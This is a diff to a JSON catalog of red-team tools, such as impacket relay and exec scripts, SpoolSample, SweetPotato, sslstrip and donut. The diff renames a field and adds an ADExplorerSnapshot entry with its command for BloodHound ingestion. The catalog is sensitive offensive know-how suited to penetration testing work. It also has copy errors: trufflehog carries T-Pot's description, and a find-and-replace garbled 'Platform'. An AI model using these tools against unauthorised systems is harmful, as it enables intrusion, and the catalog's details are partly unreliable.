         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py",
@@ -1910,7 +2009,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py",
@@ -1927,7 +2026,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux",
             "Windows"
         ],
@@ -1945,7 +2044,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux",
             "Windows"
         ],
@@ -1972,7 +2071,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/smicallef/spiderfoot",
@@ -1990,7 +2089,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [],
+        "platforms": [],
         "source": "https://github.com/BishopFox/spoofcheck",
         "description": "Simple script that checks a domain for email protections",
         "undetected": [],
@@ -2006,7 +2105,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/leechristensen/SpoolSample",
@@ -2023,7 +2122,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/byt3bl33d3r/SprayingToolkit",
@@ -2040,7 +2139,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux",
             "Windows"
         ],
@@ -2068,7 +2167,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/moxie0/sslstrip",
@@ -2086,7 +2185,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/aboul3la/Sublist3r",
@@ -2104,7 +2203,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/CCob/SweetPotato",
@@ -2122,7 +2221,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/laramies/theHarvester",
@@ -2139,7 +2238,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/rasta-mouse/ThreatCheck",
@@ -2154,11 +2253,11 @@
         "phases": [],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/telekom-security/tpotce",
-        "description": "\ud83c\udf6f T-Pot - The All In One Honeypot Platform \ud83d\udc1d",
+        "description": "\ud83c\udf6f T-Pot - The All In One Honeypot platforms \ud83d\udc1d",
         "undetected": [],
         "detected": [],
         "content": "\n\n",
@@ -2169,11 +2268,11 @@
         "phases": [],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://github.com/trufflesecurity/trufflehog",
-        "description": "\ud83c\udf6f T-Pot - The All In One Honeypot Platform \ud83d\udc1d",
+        "description": "\ud83c\udf6f T-Pot - The All In One Honeypot platforms \ud83d\udc1d",
         "undetected": [],
         "detected": [],
         "content": "## [Credentials]\n\n\n",
@@ -2186,7 +2285,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows",
             "Linux"
         ],
@@ -2206,7 +2305,7 @@
         ],
         "category": "",
         "stealthy": true,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "",
@@ -2223,7 +2322,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Python"
         ],
         "source": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py",
@@ -2241,7 +2340,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/GoSecure/WSuspicious",
@@ -2261,7 +2360,7 @@
         "category": "",
         "stealthy": false,
         "opsec": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta",
@@ -2281,7 +2380,7 @@
         "category": "",
         "stealthy": false,
         "opsec": false,
-        "oss": [
+        "platforms": [
             "Linux"
         ],
         "source": "https://linux.die.net/man/1/dig",
@@ -2300,7 +2399,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://github.com/vivami/SauronEye",
@@ -2343,7 +2442,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer",
@@ -2381,7 +2480,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows"
         ],
         "source": "https://learn.microsoft.com/en-us/sysinternals/downloads/pssuspend",
@@ -2410,7 +2509,7 @@
         ],
         "category": "",
         "stealthy": false,
-        "oss": [
+        "platforms": [
             "Windows",
             "Linux"
         ],
@@ -2426,6 +2525,43 @@
                 "tag": "",
                 "results": [],
                 "cmd": "donut.exe -i MyAssembly.exe -c MyAssembly.Program"
+            }
+        ],
+        "content": ""
+    },
+    {
+        "name": "ADExplorerSnapshot",
+        "phases": [
+            "06. Domain Enumeration"
+        ],
+        "category": "",
+        "stealthy": false,
+        "oss": [
+            "Python"
+        ],
+        "source": "https://github.com/c3c/ADExplorerSnapshot.py",
+        "description": "ADExplorerSnapshot.py is an AD Explorer snapshot parser. It is made as an ingestor for BloodHound, and also supports full-object dumping to NDJSON.",
+        "undetected": [],
+        "detected": [],
+        "commands": [
+            {
+                "id": "e3e497fc-1857-460a-a33d-3969a0a8de07",
+                "name": "Snapshot to bloodhound",
+                "description": "Transform snapshot to bloodhound zip",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:COMPUTERS",
+                    "INTEL:DOMAIN:DOMAINS",
+                    "INTEL:DOMAIN:GPOS",
+                    "INTEL:DOMAIN:GROUPS",
+                    "INTEL:DOMAIN:SID",
+                    "INTEL:DOMAIN:TRUSTS",
+                    "INTEL:DOMAIN:USERS"
+                ],
+                "cmd": "python ADExplorerSnapshot.py -o bhzip /mnt/c/Users/patri/Downloads/projects/bloodhound-import/install_temp.log",
+                "requirements": {
+                    "tag": "ADExplorer:Snapshot"
+                }
             }
         ],
         "content": ""
